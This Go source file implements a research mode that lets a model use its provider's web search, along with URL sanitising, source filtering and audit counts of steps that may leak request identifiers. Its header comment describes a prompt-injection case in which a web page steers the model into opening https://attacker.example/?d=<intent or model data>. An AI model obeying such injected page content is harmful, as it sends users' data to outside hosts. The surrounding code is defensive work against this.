package provider

import (
	"regexp"
	"slices"
	"strings"
	"time"
	"unicode"
	"unicode/utf8"
)

// Research mode (H-046 (2)): a proposal the person asked for with research
// on may let the model use its provider's own web search tool (Meta's
// search grounding) before it answers. The provider runs the searches and
// opens the pages server-side, within the one Messages call; this build
// never fetches a page, runs no tool of its own and sends nothing more than
// the sealed prompt (whose intent the person typed is what the model may
// search for). Only the proposal roles research (D-112 kept: never the
// analyst or the importer), never with images, and only on a backend that
// says it may search for the role (Researcher: the Meta adapter under an
// approval whose data policy names research for the role, or the
// deterministic fake). What a research call returns is untrusted like any
// answer: the answer is checked against the full output schema and reviewed
// by the server as always, and the sources it names are kept only when the
// call itself asked its search tool to open them (FilterSources). Meta
// returns no tool result, so an open step proves only that the model asked
// for the URL, not that the page loaded or what it said.
//
// Web content can steer the model, and the model's steps run at the
// provider: a page could tell it to open https://attacker.example/?d=<the
// intent or model data>, and the provider would fetch that URL. The server
// cannot stop a step it never sees before the provider runs it; it drops a
// source whose query string carries one of the request's own identifiers
// (ProposalContext.Markers) and counts the steps that carry one
// (WebSearch.StepsWithIDs) for the audit. Free text of the intent cannot be
// recognised this way; the data policy (synthetic data and text the person
// typed only) bounds what can leave (docs/SECURITY.md §7).

// Researcher is a backend whose provider can search the web during a call.
// The client hands a research prompt to no other backend, nor to one whose
// AcceptsResearch is false for the prompt's role, and refuses the call
// before anything else is asked (research_unsupported or
// policy_not_approved).
type Researcher interface {
	Backend
	// AcceptsResearch reports whether the backend may search the web for a
	// call of role: its approval's data policy names research for it.
	AcceptsResearch(role Role) bool
}

// CodeResearchUnsupported: the prompt asks for web research and the
// client's backend cannot search the web (the Claude adapter, the disabled
// backend): refused before any I/O. A backend that can search but whose
// approval does not name research for the role is policy_not_approved.
const CodeResearchUnsupported Code = "research_unsupported"

// Researches reports whether a prompt of role may ask for research: the
// proposal roles only (H-046 (2), D-112).
func (r Role) Researches() bool { return r == RoleModeler || r == RoleScenario }

// AcceptsResearch reports whether the client hands a research prompt of
// role to its backend, so the API can refuse a request up front. The call
// itself still checks (call).
func (c *Client) AcceptsResearch(role Role) bool {
	r, ok := c.backend.(Researcher)
	return ok && role.Researches() && r.AcceptsResearch(role)
}

// ResearchMaxOutputTokens is max_tokens for a research call: the model's
// reasoning and its narration between searches count toward max_tokens as
// they do for an image (the coordinator's probe of 2026-10-29 stopped at
// max_tokens 2000 before it answered, 1,499 of them reasoning), so a
// research call gets the same output bound as a request with images. The
// reservation follows it (meter.go).
const ResearchMaxOutputTokens int64 = 32000

// ResearchTimeout is a timeout of the budget for a research call: scaled as
// its output bound is, at most BudgetCaps.Timeout (the job timeout of
// D-007), as ImageTimeout is for an image. A slow model's research call has
// the slow model's bounds instead (SlowModelMaxOutputTokens,
// SlowModelTimeout: H-065).
func (b Budget) ResearchTimeout(d time.Duration) time.Duration {
	return min(d*time.Duration(ResearchMaxOutputTokens)/time.Duration(b.MaxOutputTokens), BudgetCaps.Timeout)
}

// ResearchMaxRetries: a research call is one attempt. One attempt may be
// billed for a whole server-side search loop whose cost nothing bounds but
// the attempt's timeout, so it is never repeated: not by the client, and
// not by the job either (internal/proposals queues a research proposal's
// job for a single attempt, ResearchJobAttempts). A failed research call
// fails the proposal; the person asks again.
const ResearchMaxRetries = 0

// Research is what a backend reports of a research call's web search: the
// provider's server tool calls as the answer lists them. Untrusted: the
// counts price the call and label it, the URLs only decide which sources
// are kept (FilterSources), and the URLs and query texts are matched against
// the request's own identifiers (StepsWithIDs); none of it is logged or
// stored.
type Research struct {
	// Queries is the number of web searches (a search step of the tool).
	Queries int
	// ToolCalls is every server tool call of the answer: searches, pages
	// opened and finds in a page. The spend counts each as a search query
	// (an upper bound: the price is per query, and the page does not say
	// whether opening a page is one).
	ToolCalls int
	// Opened are the URLs the call asked the tool to open or search in, as
	// the provider wrote them: that the page loaded is not known.
	Opened []string
	// Searched are the search steps' query texts, as the provider wrote
	// them; read only to count the ones that carry an identifier.
	Searched []string
}

// None reports whether r records no web search activity at all.
func (r Research) None() bool {
	return r.Queries == 0 && r.ToolCalls == 0 && len(r.Opened) == 0 && len(r.Searched) == 0
}

// WebSearch is what a research call's metadata records (provider_metadata
// "web_search"; never the queries, the pages or their content): counts.
// PagesOpened are the distinct URLs the call asked to open; StepsWithIDs the
// steps (search queries and URLs asked for) that carry one of the request's
// own identifiers (ProposalContext.Markers): a sign that model data may have
// left in a query or a URL.
type WebSearch struct {
	Queries        int `json:"queries"`
	ToolCalls      int `json:"tool_calls"`
	PagesOpened    int `json:"pages_opened"`
	SourcesKept    int `json:"sources_kept"`
	SourcesDropped int `json:"sources_dropped"`
	StepsWithIDs   int `json:"steps_with_ids"`
}

// SourceClaim is a source as the answer names it
// (proposal-output.schema.json sources): untrusted.
type SourceClaim struct {
	URL   string `json:"url"`
	Title string `json:"title,omitzero"`
}

// WebSource is a source the server kept (common.schema.json#/$defs/
// WebSource): a page the call asked its search tool to open (whether it
// loaded is not known), its URL canonical, its title cleaned.
type WebSource struct {
	URL   string `json:"url"`
	Title string `json:"title,omitzero"`
}

// The limits of a kept source (common.schema.json#/$defs/WebSource,
// proposal.schema.json sources).
const (
	MaxSources        = 20
	MaxSourceURLBytes = 2048
	MaxSourceTitle    = 200 // characters (runes)
)

// sourceHost is a source's host as SourceURL keeps it: a DNS name of at
// least two labels of ASCII letters, digits and hyphens whose last label
// starts with a letter (so no IPv4 address and no single-label host such as
// localhost), an IDN in its xn-- form, with an optional port; no IPv6
// literal, no user info.
var sourceHost = regexp.MustCompile(`^([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]([a-z0-9-]{0,61}[a-z0-9])?(:[0-9]{1,5})?$`)

// privateTLDs are top-level labels of names that do not name a public web
// page: loopback, link-local, internal and reverse-lookup names.
var privateTLDs = []string{"localhost", "local", "internal", "intranet", "lan", "home", "corp", "arpa"}

// sourceRest is a source's path and query: RFC 3986's unreserved and
// reserved characters and percent-encodings only (no space, quote, angle
// bracket, backslash, brace, bar, caret or backquote).
var sourceRest = regexp.MustCompile(`^([A-Za-z0-9\-._~:/?\[\]@!$&'()*+,;=]|%[0-9A-Fa-f]{2})*$`)

// SourceURL is raw as the server keeps a source's URL, or "" when it keeps
// none: an absolute https URL (the scheme in any case) whose host is a
// public-looking DNS name of ASCII letters, digits and hyphens (at least two
// labels, the last one starting with a letter and not one of privateTLDs; an
// IDN in its xn-- form, so a host is shown as it is, never as a look-alike)
// with an optional port, without user info, whose path and query are RFC
// 3986 characters; the scheme and host in lower case, an empty path written
// "/", the fragment removed, at most MaxSourceURLBytes. Anything else (http,
// javascript:, data:, a relative or protocol-relative URL, a URL with
// credentials, an IP address, localhost or another single-label host, a
// space or a non-ASCII character) is not a source. It only reads the string:
// nothing is fetched or resolved.
func SourceURL(raw string) string {
	if len(raw) < len("https://") || len(raw) > 4*MaxSourceURLBytes || !strings.EqualFold(raw[:len("https://")], "https://") {
		return ""
	}
	rest, _, _ := strings.Cut(raw[len("https://"):], "#")
	end := strings.IndexAny(rest, "/?")
	if end < 0 {
		end = len(rest)
	}
	host, path := strings.ToLower(rest[:end]), rest[end:]
	if !sourceHost.MatchString(host) || !sourceRest.MatchString(path) {
		return ""
	}
	name, _, _ := strings.Cut(host, ":")
	if tld := name[strings.LastIndexByte(name, '.')+1:]; slices.Contains(privateTLDs, tld) {
		return ""
	}
	if path == "" || path[0] == '?' {
		path = "/" + path
	}
	s := "https://" + host + path
	if len(s) > MaxSourceURLBytes {
		return ""
	}
	return s
}

// SourceTitle is a title as the server keeps it: without control, format
// (bidirectional and zero-width marks among them), private-use, surrogate
// or noncharacter code points and line or paragraph separators, white space
// collapsed to one space and trimmed, at most MaxSourceTitle characters;
// "" when nothing is left.
func SourceTitle(raw string) string {
	var b strings.Builder
	space := false
	n := 0
	for _, r := range raw {
		if n == MaxSourceTitle {
			break
		}
		switch {
		case r == utf8.RuneError, unicode.Is(unicode.Cc, r) && !unicode.IsSpace(r), unicode.Is(unicode.Cf, r), unicode.Is(unicode.Co, r),
			unicode.Is(unicode.Cs, r), noncharacter(r):
			continue
		case unicode.IsSpace(r) || unicode.Is(unicode.Zl, r) || unicode.Is(unicode.Zp, r):
			space = b.Len() > 0
			continue
		}
		if space {
			if n == MaxSourceTitle-1 {
				break
			}
			b.WriteByte(' ')
			n++
			space = false
		}
		b.WriteRune(r)
		n++
	}
	return b.String()
}

func noncharacter(r rune) bool {
	return (r >= 0xFDD0 && r <= 0xFDEF) || r&0xFFFE == 0xFFFE
}

// FilterSources keeps of the answer's claimed sources those the call asked
// its search tool to open (opened: Research.Opened), in the answer's order:
// each claim's URL and each opened URL are compared as SourceURL writes
// them, a repeat is kept once, and at most MaxSources are kept. A claim
// whose query string carries one of markers (the request's own identifiers,
// ProposalContext.Markers) is dropped too: such a URL may carry model data
// to its site, and is never shown as a link. dropped counts the claims not
// kept. A claim whose URL the call did not ask for is dropped whatever its
// title says: the answer cannot add a page to what the call asked for.
func FilterSources(claims []SourceClaim, opened []string, markers ...string) (kept []WebSource, dropped int) {
	open := make(map[string]bool, len(opened))
	for _, o := range opened {
		if u := SourceURL(o); u != "" {
			open[u] = true
		}
	}
	seen := map[string]bool{}
	for _, c := range claims {
		u := SourceURL(c.URL)
		_, query, _ := strings.Cut(u, "?")
		if u == "" || !open[u] || seen[u] || len(kept) == MaxSources || carries(query, markers) {
			dropped++
			continue
		}
		seen[u] = true
		kept = append(kept, WebSource{URL: u, Title: SourceTitle(c.Title)})
	}
	return kept, dropped
}

// MinMarker is the shortest identifier a marker check looks for: shorter
// ones match too much ordinary text.
const MinMarker = 4

// carries reports whether s, percent-decoded and in lower case, contains one
// of markers (each at least MinMarker bytes), ignoring case.
func carries(s string, markers []string) bool {
	if s == "" || len(markers) == 0 {
		return false
	}
	low := strings.ToLower(percentDecoded(s))
	for _, m := range markers {
		if len(m) >= MinMarker && strings.Contains(low, strings.ToLower(m)) {
			return true
		}
	}
	return false
}

// percentDecoded is s with each %XX written as its byte and each '+' as a
// space (a form's encoding); a '%' not followed by two hex digits stays.
func percentDecoded(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		switch {
		case s[i] == '%' && i+2 < len(s) && isHex(s[i+1]) && isHex(s[i+2]):
			b.WriteByte(unhex(s[i+1])<<4 | unhex(s[i+2]))
			i += 2
		case s[i] == '+':
			b.WriteByte(' ')
		default:
			b.WriteByte(s[i])
		}
	}
	return b.String()
}

func isHex(c byte) bool {
	return ('0' <= c && c <= '9') || ('a' <= c && c <= 'f') || ('A' <= c && c <= 'F')
}

func unhex(c byte) byte {
	switch {
	case c <= '9':
		return c - '0'
	case c <= 'F':
		return c - 'A' + 10
	}
	return c - 'a' + 10
}

// StepsWithIDs counts the research call's steps that carry one of markers:
// search query texts, and the URLs it asked for (after the host), each
// percent-decoded. A count, for the audit: the steps already ran at the
// provider.
func StepsWithIDs(r Research, markers []string) int {
	n := 0
	for _, q := range r.Searched {
		if carries(q, markers) {
			n++
		}
	}
	for _, o := range r.Opened {
		rest := o
		if i := strings.Index(o, "://"); i >= 0 {
			rest = o[i+3:]
		}
		if j := strings.IndexAny(rest, "/?"); j >= 0 && carries(rest[j:], markers) {
			n++
		}
	}
	return n
}

// pagesOpened is how many distinct pages the call opened, as SourceURL
// writes them (one it cannot read as a source is not counted).
func pagesOpened(opened []string) int {
	seen := map[string]bool{}
	for _, o := range opened {
		if u := SourceURL(o); u != "" {
			seen[u] = true
		}
	}
	return len(seen)
}
